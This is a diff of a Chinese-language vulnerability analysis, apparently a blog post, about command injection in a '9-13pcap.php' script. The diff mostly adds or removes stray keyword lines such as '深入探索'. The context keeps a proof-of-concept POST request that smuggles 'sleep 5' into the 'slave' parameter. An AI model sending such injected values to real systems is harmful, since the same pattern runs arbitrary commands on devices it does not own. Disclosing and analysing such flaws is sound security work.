@@ -16,6 +16,14 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
+深入探索
+
+script language
+
+脚本语言
+
+数据管理
+
 直接看 9-13pcap.php 关键业务逻辑实现部分
 
 ```
@@ -39,8 +47,6 @@ if($_POST[slave_download] != '')
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-编程
-
 ```
 POST /en/9-13pcap.php HTTP/1.1
 Host: synway.mrxn.net
@@ -48,6 +54,14 @@ Content-Type: application/x-www-form-urlencoded
 
 slave_download=1&slave=+;sleep 5;+#+
 ```
+
+深入探索
+
+VPN 与远程访问
+
+网络监控与管理
+
+Linux
 
 执行 `sleep 5` 命令，成功延时 5 秒
 
